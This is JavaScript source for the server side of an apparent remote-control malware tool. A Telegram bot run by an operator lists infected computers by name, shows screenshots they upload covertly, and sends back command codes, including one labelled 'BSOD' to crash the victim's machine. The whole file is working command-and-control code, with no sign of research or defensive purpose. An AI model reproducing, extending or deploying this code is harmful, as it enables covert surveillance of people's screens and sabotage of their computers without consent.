const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs'); 
const TelegramBot = require('node-telegram-bot-api');
const bodyParser = require('body-parser');
const { updateDesktops, getButtonCode, ChangeButtonCode, fetchActiveUsers, checkUserExists } = require("./database");
const dotenv = require('dotenv');


dotenv.config()





const bot = new TelegramBot(process.env.TELEGRAM_TOKEN, { polling: true });





const app = express();
const PORT = 5500;
app.use(express.urlencoded({ extended: false }));
app.use(express.json());

let extcompname = "";





async function sendImageWButtons(chatId, argument) {
    const imagePath = `./uploads/${argument}.png`;
    const imageStream = fs.createReadStream(imagePath);

    let extraOptions = {}; 
    const caption = `User: ${argument}`;
    extraOptions.caption = caption;

    const keyboard = {
        inline_keyboard: [
            [
                { text: 'Menu ↩️', callback_data: 'button_pressed' },
                { text: 'Refresh 🔄', callback_data: `button_click1_${argument}` },
                { text: 'BSOD 🪦', callback_data: `button_click2_${argument}` }
                

            ]
        ]
    };
    extraOptions.reply_markup = JSON.stringify(keyboard);

    const message = await bot.sendPhoto(chatId, imageStream, extraOptions);
}


bot.onText(/\/menu/, async (msg) => {
    const chatId = msg.chat.id;

    try {
        
        const activeUsers = await fetchActiveUsers();

        if (activeUsers.length > 0) {
            
            let message = '<b>Active Users (Last 5 minutes):</b>\n\n';
            message += '<pre>';
            message += 'Computer Name\tLast Updated\n';
            message += '-------------\t-------------\n';
            activeUsers.forEach(user => {
                message += `${user.COMPUTERNAME}\t${user.LAST_UPDATED}\n`;
            });
            message += '</pre>';

            
            bot.sendMessage(chatId, message, { parse_mode: 'HTML' });
        } else {
            bot.sendMessage(chatId, '❗ No active users found');
        }
    } catch (error) {
        bot.sendMessage(chatId, '❗ Error fetching usser .');
    }
});

bot.onText(/\/connect (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const argument = match[1];

    try {
       
        const userExists = await checkUserExists(argument);

        if (!userExists) {
           
            bot.sendMessage(chatId, '❗ Error: User does not exist.');
            return;
        }

        const imagePath = `./uploads/${argument}.png`;
        const imageStream = fs.createReadStream(imagePath);

        let extraOptions = {}; 
        const caption = `User: ${argument}`;
        extraOptions.caption = caption;

        const keyboard = {
            inline_keyboard: [
                [
                    { text: 'Menu ↩️', callback_data: 'menu' },
                    { text: 'Refresh 🔄', callback_data: `button_click1_${argument}` },
                    { text: 'BSOD 🪦', callback_data: `button_click2_${argument}` }
                ]
            ]
        };
        extraOptions.reply_markup = JSON.stringify(keyboard);

        const message = await bot.sendPhoto(chatId, imageStream, extraOptions);
    } catch (error) {
        console.error('Error handling /connect command:', error);
        bot.sendMessage(chatId, 'An error occurred while processing your request.');
    }
});



bot.onText(/\/connect$/, (msg) => {
    const chatId = msg.chat.id;

    bot.sendMessage(chatId, '❗ Error: please enter Desktop Name (ex. /connect DESKTOP-PHG923I) ');
});





bot.on('callback_query', async (callbackQuery) => {
    const data = callbackQuery.data;

    const chatId = callbackQuery.message.chat.id;
   
    if (data.startsWith('button_click1')) {
        const argument = data.split('_')[2]; 
        ChangeButtonCode(argument, 1);
        await sendImageWButtons(chatId, argument)
       
    } else if (data.startsWith('button_click2')) {
        const argument = data.split('_')[2]; 
        ChangeButtonCode(argument, 2);
       
    } else if(data == 'menu') {
        try {
            
            const activeUsers = await fetchActiveUsers();
    
            if (activeUsers.length > 0) {
                
                let message = '<b>Active Users (Last 5 minutes):</b>\n\n';
                message += '<pre>';
                message += 'Computer Name\tLast Updated\n';
                message += '-------------\t-------------\n';
                activeUsers.forEach(user => {
                    message += `${user.COMPUTERNAME}\t${user.LAST_UPDATED}\n`;
                });
                message += '</pre>';
    
               
                bot.sendMessage(chatId, message, { parse_mode: 'HTML' });
            } else {
                bot.sendMessage(chatId, '❗ No active users found');
            }
        } catch (error) {
            bot.sendMessage(chatId, '❗ Error fetching usser .');
        }
    }

    bot.answerCallbackQuery(callbackQuery.id);
});

const storage = multer.diskStorage({
    destination: function (req, file, cb) {
        cb(null, 'uploads/');
    },
    filename: function (req, file, cb) {
        const compName = req.body.computerName;
        const fileExt = extcompname + ".png";
        console.log(req.body);
        cb(null, fileExt); 
    }
});

const upload = multer({ storage: storage });


app.post('/', upload.single('image'), async (req, res) => {
    try {
        // if (!req.file) {
        //     return res.status(400).send('No file uploaded.');
        // }
        
        const computerName = req.body.computerName;
        extcompname = computerName;
        
        
        const result = await updateDesktops(computerName); // облновление времени последней активности

        const buttondb = await getButtonCode(computerName) // отправка статуса кнопки, для выполнения комманды на клиенте
       
        res.send(buttondb.toString());

        await ChangeButtonCode(computerName, 0); // сброс кнопки

       


    } catch (error) {
        console.error('Error handling file upload:', error);
        res.status(500).send('Error handling file upload.');
    }
});
app.listen(PORT, () => {
    console.log("Port is listening on port " + PORT);
}); 

